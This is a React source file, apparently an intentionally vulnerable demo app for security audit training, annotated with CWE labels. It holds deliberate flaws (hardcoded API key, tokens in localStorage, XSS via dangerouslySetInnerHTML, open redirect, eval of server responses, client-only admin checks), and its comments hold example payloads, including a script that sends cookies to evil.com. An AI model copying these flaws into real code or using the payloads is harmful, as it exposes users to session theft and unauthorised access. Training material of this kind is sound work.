/**
 * Vulnerable React App — cybersecurity audit demo
 * DO NOT USE IN PRODUCTION — intentionally contains security flaws.
 *
 * Vulnerabilities present (for audit training):
 *   [CWE-79]  XSS via dangerouslySetInnerHTML with unsanitized user input
 *   [CWE-522] API tokens stored in localStorage (persistent, accessible to JS)
 *   [CWE-312] Sensitive data (PII, tokens) stored in sessionStorage/localStorage
 *   [CWE-319] API calls over HTTP (no HTTPS enforcement in dev)
 *   [CWE-798] Hardcoded API key and base URL baked into JS bundle
 *   [CWE-200] Debug logging of sensitive user data to console
 *   [CWE-346] No CSRF token in state-mutating requests
 *   [CWE-601] Open redirect via unvalidated URL from query string
 *   [CWE-116] Improper encoding — raw eval() of server response
 *   [CWE-807] Trusting client-side role check for admin UI rendering
 */

import React, { useState, useEffect } from 'react';

// ─────────────────────────────────────────────────────────
// [CWE-798] Hardcoded API key baked into JS bundle
// Any user can view this via browser DevTools → Sources
// ─────────────────────────────────────────────────────────
const API_KEY = 'sk-prod-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';  // VULNERABLE
const API_BASE = 'http://api.example.com';                        // [CWE-319] HTTP not HTTPS

// ─────────────────────────────────────────────────────────
// [CWE-200] Logging sensitive data to console (visible in DevTools)
// ─────────────────────────────────────────────────────────
function debugLog(label, data) {
  // VULNERABLE: logs tokens, passwords, PII to browser console
  console.log(`[DEBUG] ${label}:`, data);
}

// ─────────────────────────────────────────────────────────
// Login Component
// ─────────────────────────────────────────────────────────
function Login({ onLogin }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  async function handleSubmit(e) {
    e.preventDefault();

    // [CWE-200] logs credentials to console
    debugLog('Login attempt', { username, password });

    const res = await fetch(`${API_BASE}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
      // [CWE-346] No CSRF token
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();

    // [CWE-200] logs full token response
    debugLog('Login response', data);

    if (data.token) {
      // [CWE-522] Storing auth token in localStorage — persists across sessions,
      // accessible to any JS on the page (XSS can steal it)
      localStorage.setItem('authToken', data.token);         // VULNERABLE
      localStorage.setItem('userRole', data.role);           // VULNERABLE
      localStorage.setItem('username', username);            // VULNERABLE
      onLogin(data);
    }
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={username} onChange={e => setUsername(e.target.value)} placeholder="Username" />
      <input type="password" value={password} onChange={e => setPassword(e.target.value)} placeholder="Password" />
      <button type="submit">Login</button>
    </form>
  );
}

// ─────────────────────────────────────────────────────────
// Search Component — XSS via dangerouslySetInnerHTML
// ─────────────────────────────────────────────────────────
function UserSearch() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState('');

  async function handleSearch() {
    const token = localStorage.getItem('authToken');
    const res = await fetch(`${API_BASE}/api/users/search?q=${query}`, {
      headers: { Authorization: `Bearer ${token}`, 'X-API-Key': API_KEY },
    });
    const text = await res.text();
    // [CWE-79] XSS — server response injected directly as raw HTML
    // Attacker controls server or performs MITM → arbitrary JS execution
    setResults(text);
  }

  return (
    <div>
      <input value={query} onChange={e => setQuery(e.target.value)} placeholder="Search users" />
      <button onClick={handleSearch}>Search</button>
      {/* [CWE-79] VULNERABLE — unsanitized HTML from server */}
      <div dangerouslySetInnerHTML={{ __html: results }} />
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// Comment Board — XSS via dangerouslySetInnerHTML (stored)
// ─────────────────────────────────────────────────────────
function CommentBoard() {
  const [comment, setComment] = useState('');
  const [comments, setComments] = useState([]);

  function addComment() {
    // [CWE-79] XSS — user comment stored and re-rendered as raw HTML
    // Attacker posts <script>document.location='https://evil.com?c='+document.cookie</script>
    setComments(prev => [...prev, comment]);
    setComment('');
  }

  return (
    <div>
      <textarea value={comment} onChange={e => setComment(e.target.value)} placeholder="Leave a comment (HTML allowed!)" />
      <button onClick={addComment}>Post</button>
      <div>
        {comments.map((c, i) => (
          // [CWE-79] VULNERABLE — raw HTML rendered for every comment
          <div key={i} dangerouslySetInnerHTML={{ __html: c }} />
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// Admin Panel — client-side role check only (bypassable)
// ─────────────────────────────────────────────────────────
function AdminPanel() {
  // [CWE-807] Trusting client-side localStorage role for admin UI
  // Attacker: localStorage.setItem('userRole', 'admin') → sees admin UI
  const role = localStorage.getItem('userRole');

  if (role !== 'admin') {
    return <p>Access denied.</p>;
  }

  async function deleteUser(id) {
    const token = localStorage.getItem('authToken');
    await fetch(`${API_BASE}/admin/delete?id=${id}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${token}`, 'X-API-Key': API_KEY },
      // [CWE-346] No CSRF protection
    });
  }

  return (
    <div>
      <h2>Admin Panel (client-side role check only!)</h2>
      <button onClick={() => deleteUser(2)}>Delete user 2</button>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// Open Redirect — unvalidated redirect URL from query string
// ─────────────────────────────────────────────────────────
function RedirectHandler() {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const next = params.get('next');
    if (next) {
      // [CWE-601] VULNERABLE: redirect to any URL without validation
      // Phishing: /redirect?next=https://evil.com/fake-login
      window.location.href = next;
    }
  }, []);
  return <p>Redirecting...</p>;
}

// ─────────────────────────────────────────────────────────
// Server-pushed script eval — eval() on API response
// ─────────────────────────────────────────────────────────
async function loadDynamicConfig() {
  const res = await fetch(`${API_BASE}/api/config`);
  const text = await res.text();
  // [CWE-95] VULNERABLE: eval() on server response — RCE if server is compromised
  // eslint-disable-next-line no-eval
  eval(text);
}

// ─────────────────────────────────────────────────────────
// Main App
// ─────────────────────────────────────────────────────────
export default function App() {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Load dynamic config on startup — runs eval() on server response
    loadDynamicConfig().catch(() => {});
  }, []);

  return (
    <div>
      <h1>Vulnerable React Demo</h1>
      {!user ? (
        <Login onLogin={setUser} />
      ) : (
        <div>
          <UserSearch />
          <CommentBoard />
          <AdminPanel />
          <RedirectHandler />
        </div>
      )}
    </div>
  );
}
